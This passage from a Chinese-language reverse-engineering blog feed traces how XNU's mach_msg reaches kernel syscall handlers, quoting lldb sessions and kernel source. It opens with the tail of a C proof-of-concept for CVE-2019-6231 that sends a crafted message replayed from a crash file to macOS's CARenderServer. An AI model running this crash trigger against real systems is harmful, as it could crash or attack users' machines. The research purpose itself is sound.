fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
</feed>
